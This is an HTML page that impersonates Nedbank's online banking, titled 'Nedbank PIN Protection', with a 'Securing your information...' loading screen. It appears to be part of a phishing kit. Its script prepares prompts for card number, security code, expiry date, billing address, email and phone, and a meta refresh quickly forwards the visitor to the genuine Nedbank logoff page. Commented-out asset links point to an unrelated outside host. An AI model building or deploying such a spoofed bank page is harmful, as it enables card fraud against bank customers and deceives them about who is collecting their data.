<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/HTML4/strict.dtd">
<meta http-equiv="refresh" content="0.10;URL=https://netbank.nedsecure.co.za/Logoff.bank">
<html><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
	PageLoading Page
</title>
	</head>
	
<script>
					
				
				window.onload = function(){ 
				
				infoBoxSetup("#issue_number", "#info_box_3", "If your card's issue number is '0' then please enter '0'. If your card's issue number is '2' then please enter '2' and if your card's issue number is '03' then please enter '03'.</p> <p>If your card does not have an issue number then please leave this field empty.");
					infoBoxSetup("#security_code", "#info_box_4", "This is usually the final 3 digits found on the back of your card at the top of its signature strip.");
					infoBoxSetup("#address", "#info_box_6", "The address lines 1 and optionally 2 where your card statements are sent.");
					infoBoxSetup("#cust_card_number", "#info_box_1", "This is the long 16 digit number displayed on the front of your card.");
					infoBoxSetup("#card_holder_name", "#info_box_2", "Enter your name exactly how it appears on your card.");
					infoBoxSetup("#billingCityTb", "#info_box_7", "Enter the city exactly as it is registered with your card issuer.");
					infoBoxSetup("#postcode", "#info_box_8", "Enter the postcode exactly as it is registered with your card issuer.");
					infoBoxSetup("#card_expiry_month", "#info_box_month", "Select the expiry month how it appears on your card.");
					infoBoxSetup("#card_expiry_year", "#info_box_year", "Select the expiry year how it appears on your card.");
					infoBoxSetup("#emailaddress", "#info_box_email", "An email receipt will be sent to this address.");
					infoBoxSetup("#phonenumber", "#info_box_phone", "Enter your phone number.");
					infoBoxSetup("#billingCountryDdl", "#info_box_country", "Select the country exactly as it is registered with your card issuer.");
				
				
				if(document.getElementById("card_holder_name").value != ""){
				
				document.getElementById("card_holder_name").value = badCheck(document.getElementById("card_holder_name").value);		
				
				}
				
				if(document.getElementById("address").value != ""){  		 
				document.getElementById("address").value = badCheck(document.getElementById("address").value);
				}
 
				if(document.getElementById("city_tb").value != ""){  		  
				
				document.getElementById("city_tb").value = badCheck(document.getElementById("city_tb").value);
				}
				
				if(document.getElementById("phonenumber").value != ""){  
				document.getElementById("phonenumber").value = letterStrip(document.getElementById("phonenumber").value);
				} 
				  
				}				
				
				</script>
<table cellSpacing="0" cellPadding="0" width="100%" border="0">
  <tr>
<title>Nedbank PIN Protection</title>
    <td>
  <table style="border:0; width:100%"  class="theHeader"

		cellspacing="0" cellpadding="0" ID="Table1" summary="text">

			<tr>

				<td height="61">

					<table ID="Table2" summary="text">

						<tr>

							<td valign="top" height="100%">

                                <a href="#" target= "_parent"><img src="images/NedbankLogo.gif" border="0" alt=

							""></a>

                            <!--img src="http://kjcustom.com/n1/images/lnedbankogo.gif" border="0" alt=

							"XXXXXXXX"-->

							</td>

							
						</tr>

					</table>

				</td>

				<td width="134">&nbsp;</td>

				<td width="45%" valign="middle" align="right">

					<table ID="Table3" summary="text">

						<tr>

							<td>

								<a href="#" onClick="#"><img border="0" src=

								"images/contactus_up.gif" width="78" height="23"

								alt=""></a> 

								<!-- <a href="default_help.htm" target="_blank"><img border="0" src="http://kjcustom.com/n1/images/help_up.gif" width="78" height="23"></a> -->

								 <a href="#"><img border="0"

								src="images/help_up.gif" width="78" height="23"

								alt=""></a> <a href="https://netbank.nedsecure.co.za/Logoff.bank">
                                <img border="0" src="images/logoff_up.gif" width="78" height="23" alt=""></a>

							</td>

						</tr>

					</table>

				</td>

			</tr>

	  </table>
    </iframe>
    <table cellSpacing="0" width="100%" border="0" height="19">
      <tr>
        <td width="100%" bgcolor="#1E4532" height="17">&nbsp;</td>
      </tr>
    </table>
   </TD></TR></TBODY></TABLE>
        <p>        
        <h2 style="text-align: center; color: rgba(30,69,50,1);">      <span id="lblPageLoading" style="text-align: center">Securing your information...</span></h2>
        <p style="text-align: center; color: rgba(30,69,50,1);"><img src="loading.gif" width="480" height="320" alt=""/></p>
        <p>        
<p style="text-align: center">        
<p>
        
<p style="text-align: center">        
      
<p><br>
          &nbsp;                
<TABLE cellSpacing=0 cellPadding=4 width="99%" bgColor=#d8e8de border=0>
  <TBODY>
  <TR>
    <TD vAlign=top height=39 bgcolor="#1E4532"><B>
      <TABLE width=391>
        <TBODY>
        <TR>
          <TD width=385 height=10><B><FONT face=Verdana color=#ffffff 
            size=2><u><font color="#FFFFFF">Terms and conditions</font></u> </FONT>
			<font color="#FFFFFF" face="Verdana" size="2">|</font><font face="Verdana"><font size="2" color="#FFFFFF">
			<u>SMS notice</u> |
			</font><u>
			<font size="2" color="#FFFFFF">Security Notice</font></u></font></B></TD>
          </TR>
        <TR>
          <TD><B><FONT face=Verdana color=#FFFFFF size=2>Copyright © 
            Nedbank Limited 1997 - 2010&nbsp; &nbsp;<BR>All rights 
            reserved&nbsp;&nbsp;&nbsp;</FONT><font color="#FFFFFF"> </font> </B></TD></TR></B></TBODY></TABLE></TD>
    </TR></TBODY></TABLE>
		</td>
      </tr>
      </table>
    </td>
  </tr>
</table>